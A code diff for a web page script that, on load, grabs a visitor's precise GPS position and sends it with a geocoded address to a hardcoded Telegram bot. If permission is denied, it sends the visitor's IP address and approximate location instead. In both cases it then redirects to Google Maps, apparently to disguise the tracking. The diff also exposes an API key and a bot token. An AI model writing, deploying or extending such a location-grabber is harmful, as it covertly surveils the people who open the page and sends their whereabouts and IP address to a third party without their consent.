@@ -1,58 +1,70 @@
-const locationDisplay = document.getElementById("location");
-const loadingOverlay = document.getElementById("loading");
-const retryBtn = document.getElementById("retry-btn");
+const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
+const TELEGRAM_CHAT_ID = '6602027873';
+const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
+const redirectURL = 'https://maps.google.com';
 
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(success, error, {
-    enableHighAccuracy: true,
-    timeout: 10000,
-    maximumAge: 0
-  });
-}
-
-function success(pos) {
-  const lat = pos.coords.latitude;
-  const lon = pos.coords.longitude;
-
-  fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=8e640acb36a3409a9877e0c900653f7d`)
-    .then(res => res.json())
-    .then(data => {
-      const c = data.results[0].components;
-      const locationString = `${c.country}, ${c.state}, ${c.county || c.district}, ${c.village || c.suburb || c.town || c.city || ''}`;
-      locationDisplay.textContent = locationString;
-      loadingOverlay.style.display = "none";
-
-      // 🔹 Send to Telegram
-      const message = `📍 New Location:\n${locationString}\nLatitude: ${lat}\nLongitude: ${lon}`;
-      fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "6602027873",
-          text: message
-        })
-      });
-
-    })
-    .catch(() => {
-      locationDisplay.textContent = "Location lookup failed.";
-      loadingOverlay.style.display = "none";
-    });
-}
-
-function error(err) {
-  locationDisplay.textContent = "GPS denied. Cannot get exact location.";
-  loadingOverlay.style.display = "none";
-}
-
-retryBtn.addEventListener("click", () => {
-  loadingOverlay.style.display = "flex";
-  locationDisplay.textContent = "Retrying...";
-  getLocation();
-});
+const loading = document.getElementById('loading-screen');
+const retryBtn = document.getElementById('retry-location');
 
 window.onload = () => {
   getLocation();
 };
+
+retryBtn.onclick = () => {
+  getLocation();
+};
+
+function getLocation() {
+  loading.style.display = 'flex';
+  navigator.geolocation.getCurrentPosition(success, denied, { enableHighAccuracy: true });
+}
+
+function success(position) {
+  const { latitude, longitude } = position.coords;
+  reverseGeocode(latitude, longitude, (locationName) => {
+    const message = `
+✅ USER ALLOWED LOCATION
+🌍 Lat: ${latitude}
+🌍 Lon: ${longitude}
+📍 Address: ${locationName}
+    `.trim();
+    sendTelegram(message);
+    window.location.href = redirectURL;
+  });
+}
+
+function denied() {
+  fetch('https://ipwho.is')
+    .then(res => res.json())
+    .then(data => {
+      const locationName = `${data.country}, ${data.region}, ${data.city}`;
+      const message = `
+❌ USER DENIED LOCATION
+🔹 IP: ${data.ip}
+📍 Approx Address: ${locationName}
+      `.trim();
+      sendTelegram(message);
+      window.location.href = redirectURL;
+    });
+}
+
+function reverseGeocode(lat, lon, callback) {
+  fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`)
+    .then(res => res.json())
+    .then(data => {
+      const location = data.results[0]?.formatted || 'Unknown';
+      callback(location);
+    });
+}
+
+function sendTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  });
+}
